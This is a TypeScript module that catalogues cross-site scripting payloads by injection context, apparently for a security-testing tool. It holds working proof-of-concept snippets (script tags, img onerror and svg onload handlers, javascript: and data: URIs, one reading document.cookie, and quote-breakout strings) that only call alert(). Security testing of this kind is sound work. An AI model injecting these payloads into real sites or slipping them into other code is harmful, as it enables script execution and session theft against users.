export interface PayloadDefinition {
  id: string;
  title: string;
  context: string;
  sinkType: string;
  snippet: string;
  description: string;
}

export interface PayloadGroup {
  id: string;
  title: string;
  description: string;
  payloads: PayloadDefinition[];
}

export const payloadGroups: PayloadGroup[] = [
  {
    id: 'dom-html',
    title: 'HTML element contexts',
    description:
      'Snippets that execute when user input is written into the DOM with innerHTML, outerHTML, or document.write.',
    payloads: [
      {
        id: 'script-alert',
        title: 'Classic script tag',
        context: 'HTML fragment',
        sinkType: 'element.innerHTML',
        snippet: "<script>alert(document.domain)</script>",
        description:
          'Injects a script element that immediately executes in browsers that evaluate HTML fragments as code.',
      },
      {
        id: 'image-onerror',
        title: 'Image error handler',
        context: 'HTML attribute',
        sinkType: 'element.innerHTML',
        snippet: '<img src="x" onerror="alert(\'xss\')" />',
        description:
          'Leverages an <img> error handler; when the broken image fails to load, the onerror script runs.',
      },
      {
        id: 'svg-onload',
        title: 'SVG onload',
        context: 'SVG fragment',
        sinkType: 'document.write',
        snippet: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'xss\')"></svg>',
        description:
          'Uses an inline SVG that fires onload immediately, useful for sinks that sanitize only HTML elements.',
      },
    ],
  },
  {
    id: 'url-attributes',
    title: 'URL & attribute sinks',
    description:
      'Useful for testing href, src, or similar assignments where untrusted data is dropped into a URL attribute.',
    payloads: [
      {
        id: 'javascript-protocol',
        title: 'javascript: URI',
        context: 'Hyperlink attribute',
        sinkType: 'element.href',
        snippet: 'javascript:alert(document.cookie)',
        description:
          'Abuses the javascript: protocol so a click executes code instead of navigating to a different origin.',
      },
      {
        id: 'data-uri',
        title: 'data:text/html wrapper',
        context: 'Hyperlink attribute',
        sinkType: 'element.href',
        snippet: "data:text/html,<script>alert('xss')</script>",
        description:
          'Wraps a payload in a data URI to trigger script execution in a new document when the link is opened.',
      },
      {
        id: 'srcdoc-iframe',
        title: 'srcdoc iframe payload',
        context: 'iframe attribute',
        sinkType: 'iframe.srcdoc',
        snippet: '<iframe srcdoc="<script>alert(\'xss\')</script>"></iframe>',
        description:
          'Targets features that populate iframe.srcdoc or similar attributes without sanitization.',
      },
    ],
  },
  {
    id: 'script-templates',
    title: 'Script & template escapes',
    description:
      'Break out of JavaScript or attribute string templates by injecting delimiters and inline statements.',
    payloads: [
      {
        id: 'string-breakout',
        title: 'Break out of double quotes',
        context: 'Inline script string literal',
        sinkType: 'string interpolation',
        snippet: '";alert(\'xss\');//',
        description:
          'Closes a double-quoted string, runs alert(), and comments out the remainder of the vulnerable script.',
      },
      {
        id: 'single-quote-breakout',
        title: 'Break out of single quotes',
        context: 'Inline script string literal',
        sinkType: 'string interpolation',
        snippet: "';alert('xss');//",
        description:
          'Pairs with sinks that wrap data in single quotes, leaving a trailing comment to avoid syntax errors.',
      },
      {
        id: 'script-end-tag',
        title: 'End script with HTML payload',
        context: 'Inline script escaped into HTML',
        sinkType: 'script block',
        snippet: '</script><img src=x onerror="alert(\'xss\')">',
        description:
          'Terminates the current <script> tag and injects HTML that executes immediately when parsed.',
      },
    ],
  },
];

export type PayloadGroups = typeof payloadGroups;
